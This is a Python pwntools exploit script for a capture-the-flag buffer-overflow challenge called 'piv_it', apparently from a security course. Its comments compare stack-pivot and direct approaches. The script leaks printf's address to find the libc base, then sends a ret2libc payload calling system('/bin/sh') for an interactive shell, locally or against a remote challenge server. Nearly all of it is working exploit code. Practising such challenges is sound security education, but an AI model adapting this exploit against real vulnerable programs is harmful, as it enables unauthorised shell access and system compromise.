#!/usr/bin/env python3
from pwn import *

# Before creating the script:

# Note that whilst in my solution I used a stack pivot, since there was enough space
# in the second buffer, we could simply call system binsh at our offset instead of
# placing a pivot to jump to the first buffer which contains a ROP chain.

# Also, unlike in my solution, at the start of the script he created a variable 'libc'
# which reads the ELF of the libc being used. So, to solve locally we just put the
# path to our version of libc being used, and when switching to remote, we just
# download the libc file from the database and keep it in the same directory as the
# script, giving the name of the libc file. Hence, we don't have to change any other
# addresses in other parts of the code, since all libc gadgets are accessed in
# pwntools using this libc variable.

# The script:
PROGNAME = "challenges/./piv_it"
REMOTEIP = "plsdonthaq.me"
REMOTEPORT = 8002

if args.REMOTE:
    p = remote(REMOTEIP, REMOTEPORT)
    libc = ELF("libc6_2.27-3ubuntu1_i386.so")
else:
    p = process(PROGNAME)
    libc = ELF("/lib/i386-linux-gnu/libc-2.27.so")

printf = libc.symbols.printf
LIBC_SYSTEM = libc.symbols.system
LIBC_BIN_SH = next(libc.search(b"/bin/sh"))

p.recvuntil("At: ")
libc_base = int(p.recv(10), 0) - printf
log.info(f"libc base: {hex(libc_base)}")

p.sendlineafter("$ ", "")

system = p32(libc_base + LIBC_SYSTEM)
bin_sh = p32(libc_base + LIBC_BIN_SH)

# system("/bin/sh")
p.sendlineafter("$", flat({
    0x20: system,
    0x28: bin_sh
}))

p.interactive()